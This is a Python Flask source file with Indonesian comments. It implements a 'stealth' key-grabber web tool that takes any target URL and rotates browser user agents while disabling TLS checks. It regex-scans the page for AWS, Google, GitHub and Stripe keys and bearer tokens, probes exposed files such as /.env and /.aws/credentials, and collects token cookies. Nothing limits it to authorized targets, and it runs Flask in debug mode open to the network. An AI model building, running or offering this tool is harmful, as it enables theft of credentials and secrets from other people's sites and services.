import re
import time
import random
import requests
from flask import Flask, render_template, request, jsonify
from urllib.parse import urlparse

app = Flask(__name__)

# ===== KONFIGURASI STEALTH =====
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# ===== FUNGSI CAPTCHA SIMULASI =====
def solve_captcha(session, target_url):
    # Minta user untuk isi captcha manual (1x aja)
    # Ini bagian yang lo isi
    captcha_token = input("[?] Masukkan captcha token (klik di captcha, copy): ")
    return captcha_token

# ===== FUNGSI GRABBER =====
def grab_keys(target_url):
    results = {
        'success': False,
        'data': [],
        'keys': [],
        'time': time.time()
    }

    try:
        # Set headers stealth
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        session = requests.Session()
        
        # 1. GET halaman utama
        resp = session.get(target_url, headers=headers, timeout=10, verify=False)
        if resp.status_code != 200:
            results['data'].append(f"[!] Gagal akses: Status {resp.status_code}")
            return results

        # 2. Cek pola key (regex)
        patterns = {
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'Google API': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
            'Stripe Key': r'sk_live_[0-9a-zA-Z]{24}',
            'Generic Secret': r'(?:secret|key|token|password|api_key|access_token)\s*[=:]\s*[\'"]?([a-zA-Z0-9\-_]{20,50})[\'"]?',
            'Bearer Token': r'Bearer\s+[a-zA-Z0-9\-_]{20,}',
            'Firebase Config': r'firebaseConfig\s*=\s*{[^}]+}'
        }
        
        found_keys = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, resp.text, re.IGNORECASE)
            if matches:
                found_keys[name] = list(set(matches))  # unique

        # 3. Scan file .env / config
        common_files = ['/.env', '/config.php', '/.aws/credentials', '/admin/config.php', '/api/keys']
        for file in common_files:
            test_url = target_url + file
            try:
                r2 = session.get(test_url, headers=headers, timeout=5, verify=False)
                if r2.status_code == 200:
                    found_keys[f'FILE_{file}'] = ['[FILE TERBUKA] ' + r2.text[:200]]
            except:
                pass

        # 4. Cek cookies yang mengandung token
        for cookie in session.cookies:
            if 'token' in cookie.name.lower() or 'key' in cookie.name.lower():
                found_keys[f'COOKIE_{cookie.name}'] = [cookie.value]

        results['keys'] = found_keys
        results['success'] = True
        
        # Tambahkan waktu eksekusi
        results['time'] = time.time() - results['time']
        results['data'].append(f"[+] Selesai dalam {results['time']:.2f} detik.")
        
    except Exception as e:
        results['data'].append(f"[!] Error: {str(e)}")

    return results

# ===== ROUTE WEBSITE =====
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target_url = request.form.get('url')
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        # Eksekusi grabber
        result = grab_keys(target_url)
        
        # Tampilkan hasil sebagai JSON di web
        return render_template('result.html', result=result, url=target_url)
    
    return render_template('index.html')

if __name__ == '__main__':
    # Jalankan dengan mode debug, bisa diakses dari HP/PC
    app.run(debug=True, host='0.0.0.0', port=5000)
